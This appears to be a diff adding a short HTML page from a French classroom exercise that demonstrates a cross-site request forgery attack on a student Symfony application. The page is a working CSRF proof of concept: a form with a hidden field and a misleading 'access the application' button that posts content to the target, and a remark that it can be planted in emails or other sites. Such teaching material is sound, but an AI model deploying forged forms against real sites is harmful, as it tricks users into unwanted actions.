@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>
+            attaque - CSRF
+        </title>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+
+      
+    </head>
+    <body>
+        <div class="container p-3 my-3 border">
+
+            <h2>Symfony - attaque CSRF</h2>
+<!-- adapter le formulaire en mettant l'adresse IP de votre serveur symfony dans l'URL -->
+<form action="http://symfony.btssiobayonne.fr/~login/projet_secu/public/index.php/testCSRF" method="POST">
+
+<input type="hidden" name="form[nom]" value="texte ne respectant pas les conditions d'utilisation" />
+
+   <input  class="btn btn-primary" type="submit" value="Accès à l'application" /> 
+</form>
+ce bouton peuvent être déployés dans un mail, un autre site
+
+        </div>
+
+
+    </body>
+</html>
